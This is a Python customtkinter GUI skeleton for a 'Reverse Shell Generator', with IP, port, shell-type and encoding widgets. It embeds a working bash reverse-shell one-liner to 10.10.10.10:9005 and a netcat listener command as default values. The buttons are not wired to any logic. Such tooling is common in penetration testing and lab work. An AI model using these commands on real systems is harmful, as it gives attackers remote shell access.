import customtkinter as ctk

class ReverseShellApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        
        self.title("Reverse Shell Generator")
        self.geometry("800x600")

        self.create_widgets()
    
    def create_widgets(self):
        # IP & Port Frame
        ip_port_frame = ctk.CTkFrame(self)
        ip_port_frame.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
        ctk.CTkLabel(ip_port_frame, text="IP").grid(row=0, column=0, padx=5, pady=5)
        self.ip_entry = ctk.CTkEntry(ip_port_frame)
        self.ip_entry.grid(row=0, column=1, padx=5, pady=5)
        self.ip_entry.insert(0, "10.10.10.10")
        
        ctk.CTkLabel(ip_port_frame, text="Port").grid(row=1, column=0, padx=5, pady=5)
        self.port_entry = ctk.CTkEntry(ip_port_frame)
        self.port_entry.grid(row=1, column=1, padx=5, pady=5)
        self.port_entry.insert(0, "9005")
        
        # Listener Frame
        listener_frame = ctk.CTkFrame(self)
        listener_frame.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")
        
        self.advanced_var = ctk.BooleanVar(value=True)
        self.advanced_check = ctk.CTkCheckBox(listener_frame, text="Advanced", variable=self.advanced_var)
        self.advanced_check.grid(row=0, column=0, padx=5, pady=5)
        
        self.listener_entry = ctk.CTkEntry(listener_frame)
        self.listener_entry.grid(row=1, column=0, padx=5, pady=5)
        self.listener_entry.insert(0, "nc -lvnp 9005")
        
        ctk.CTkLabel(listener_frame, text="Type").grid(row=2, column=0, padx=5, pady=5)
        self.type_combobox = ctk.CTkComboBox(listener_frame, values=["nc", "ncat"])
        self.type_combobox.grid(row=3, column=0, padx=5, pady=5)
        self.type_combobox.set("nc")
        
        self.copy_button = ctk.CTkButton(listener_frame, text="Copy")
        self.copy_button.grid(row=4, column=0, padx=5, pady=5)
        
        # Reverse Shell Frame
        reverse_shell_frame = ctk.CTkFrame(self)
        reverse_shell_frame.grid(row=1, column=0, columnspan=2, padx=10, pady=10, sticky="nsew")
        
        self.shell_text = ctk.CTkTextbox(reverse_shell_frame, height=5)
        self.shell_text.grid(row=0, column=0, columnspan=2, padx=5, pady=5)
        self.shell_text.insert("0.0", "bash -i >& /dev/tcp/10.10.10.10/9005 0>&1")
        
        ctk.CTkLabel(reverse_shell_frame, text="Shell").grid(row=1, column=0, padx=5, pady=5)
        self.shell_combobox = ctk.CTkComboBox(reverse_shell_frame, values=["bash", "sh"])
        self.shell_combobox.grid(row=1, column=1, padx=5, pady=5)
        self.shell_combobox.set("bash")
        
        ctk.CTkLabel(reverse_shell_frame, text="Encoding").grid(row=2, column=0, padx=5, pady=5)
        self.encoding_combobox = ctk.CTkComboBox(reverse_shell_frame, values=["None", "Base64"])
        self.encoding_combobox.grid(row=2, column=1, padx=5, pady=5)
        self.encoding_combobox.set("None")
        
        self.raw_button = ctk.CTkButton(reverse_shell_frame, text="Raw")
        self.raw_button.grid(row=3, column=0, padx=5, pady=5)
        
        self.copy_shell_button = ctk.CTkButton(reverse_shell_frame, text="Copy")
        self.copy_shell_button.grid(row=3, column=1, padx=5, pady=5)

if __name__ == "__main__":
    app = ReverseShellApp()
    app.mainloop()
